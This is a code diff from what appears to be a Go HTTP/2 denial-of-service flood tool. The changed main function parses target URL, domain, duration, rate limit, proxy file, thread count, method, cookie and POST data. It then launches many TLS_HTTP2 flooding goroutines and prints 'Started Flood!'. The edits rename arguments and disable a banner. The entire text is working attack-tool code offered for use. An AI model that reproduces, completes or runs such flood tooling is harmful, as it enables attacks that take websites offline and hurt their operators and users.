@@ -27,18 +27,18 @@ func InitializeUserAgents() {
 func main() {
 	InitializeUserAgents()
 	rand.Seed(time.Now().UnixNano())
-	ShareBanner := Parser()
-	if len(os.Args) < 8 {
+	//ShareBanner := Parser()
+	/*if len(os.Args) < 8 {
 		fmt.Println(len(os.Args))
-		fmt.Println(ShareBanner)
+		//fmt.Println(ShareBanner)
 		return
-	}
+	}*/
 
 	var HTTPVersion string
-	var Host string
+	var Url string
 	var HTTP_HOST string
 	var limit int
-	var list string
+	var proxyFile string
 	var threads int
 	var mode string
 	var dur int
@@ -50,16 +50,16 @@ func main() {
 	for _, x := range Arguments {
 		if strings.Contains(x, "version=") {
 			HTTPVersion = strings.Split(x, "=")[1]
-		} else if strings.Contains(x, "host=") {
-			Host = strings.Split(x, "=")[1]
+		} else if strings.Contains(x, "url=") {
+			Url = strings.Split(x, "=")[1]
 		} else if strings.Contains(x, "domain=") {
 			HTTP_HOST = strings.Split(x, "=")[1]
 		} else if strings.Contains(x, "time=") {
 			dur, _ = strconv.Atoi(strings.Split(x, "=")[1])
 		} else if strings.Contains(x, "limit=") {
 			limit, _ = strconv.Atoi(strings.Split(x, "=")[1])
-		} else if strings.Contains(x, "list=") {
-			list = strings.Split(x, "=")[1]
+		} else if strings.Contains(x, "proxyFile=") {
+			proxyFile = strings.Split(x, "=")[1]
 		} else if strings.Contains(x, "threads=") {
 			threads, _ = strconv.Atoi(strings.Split(x, "=")[1])
 		} else if strings.Contains(x, "mode=") {
@@ -74,7 +74,7 @@ func main() {
 			} else if !strings.Contains(x, "data=") {
 				data = nil
 			}
-			fmt.Println(ShareBanner)
+			//fmt.Println(ShareBanner)
 		}
 	}
 	//fmt.Println(HTTPVersion, Host, HTTP_HOST, limit, threads, mode, cookie, data, list)
@@ -82,7 +82,7 @@ func main() {
 		mode = "POST"
 	}
 
-	f, err := os.Open(list)
+	f, err := os.Open(proxyFile)
 	if err != nil {
 		fmt.Println("Proxy file does not exist!", err)
 		return
@@ -101,7 +101,7 @@ func main() {
 	}
 
 	New := Attack{
-		Url:           Host,
+		Url:           Url,
 		Host:          HTTP_HOST,
 		AttackMethod:  mode,
 		PostData:      data,
@@ -109,15 +109,16 @@ func main() {
 		Cookie:        cookie,
 	}
 	Sys = System{
-		Banner:       ShareBanner,
+		//Banner:       ShareBanner,
 		HTTP2Timeout: 10000,
 		Attack:       &New,
 	}
 
 	for x := 0; x < threads; x++ {
-		go HTTP2(&ThreadSync)
+		go TLS_HTTP2(&ThreadSync)
 		ThreadSync.Add(1)
 	}
+	//
 	ThreadSync.Wait()
 	close(start)
 	fmt.Println("Started Flood!")
